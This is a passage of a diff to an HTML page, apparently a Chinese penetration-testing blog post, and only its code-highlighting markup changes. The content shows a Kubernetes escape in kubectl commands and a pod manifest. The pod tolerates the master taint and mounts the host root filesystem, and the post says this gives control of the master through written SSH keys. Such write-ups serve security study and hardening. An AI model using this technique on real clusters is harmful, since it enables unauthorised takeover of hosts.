@@ -125,35 +125,35 @@
 <ol>
 <li>确认Master节点的容忍度</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl describe node &lt;Node Name&gt;
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b454933a-4f5f-11ec-a431-00d861bf4abb.png" alt="2021-07-20-10-59-50"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl describe node &lt;Node Name&gt;
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b454933a-4f5f-11ec-a431-00d861bf4abb.png" alt="2021-07-20-10-59-50"></p>
 <ol start="2">
 <li>创建带有容忍参数的Pod</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl create -f control-master.yaml
-</code></pre></div><p>control-master.yaml内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
-<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
-<span style="color:#f92672">metadata</span>:
-<span style="color:#f92672">name</span>: <span style="color:#ae81ff">control-master-3</span>
-<span style="color:#f92672">spec</span>:
-<span style="color:#f92672">tolerations</span>:
-- <span style="color:#f92672">key</span>: <span style="color:#ae81ff">node-role.kubernetes.io/master</span>
-<span style="color:#f92672">operator</span>: <span style="color:#ae81ff">Exists</span>
-<span style="color:#f92672">effect</span>: <span style="color:#ae81ff">NoSchedule</span>
-<span style="color:#f92672">containers</span>:
-- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">control-master-3</span>
-<span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu:18.04</span>
-<span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sleep&#34;</span>, <span style="color:#e6db74">&#34;3650d&#34;</span>]
-<span style="color:#f92672">volumeMounts</span>:
-- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">master</span>
-<span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/master</span>
-<span style="color:#f92672">volumes</span>:
-- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">master</span>
-<span style="color:#f92672">hostPath</span>:
-<span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
-<span style="color:#f92672">type</span>: <span style="color:#ae81ff">Directory</span>
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b4bba0de-4f5f-11ec-b260-00d861bf4abb.png" alt="2021-07-20-11-02-18"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl create -f control-master.yaml
+</span></span></code></pre></div><p>control-master.yaml内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">name</span>: <span style="color:#ae81ff">control-master-3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">tolerations</span>:
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">key</span>: <span style="color:#ae81ff">node-role.kubernetes.io/master</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">operator</span>: <span style="color:#ae81ff">Exists</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">effect</span>: <span style="color:#ae81ff">NoSchedule</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">control-master-3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu:18.04</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sleep&#34;</span>, <span style="color:#e6db74">&#34;3650d&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">master</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/master</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">master</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">type</span>: <span style="color:#ae81ff">Directory</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b4bba0de-4f5f-11ec-b260-00d861bf4abb.png" alt="2021-07-20-11-02-18"></p>
 <p>在多次创建Pod后，会发现Pod会在Master节点上出现，再利用kubectl进入容器，执行逃逸。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b5136788-4f5f-11ec-9315-00d861bf4abb.png" alt="2021-07-20-11-06-24"></p>
 <p>至此，逃逸完成，能够通过写公私钥的方式控制Master宿主机。</p>
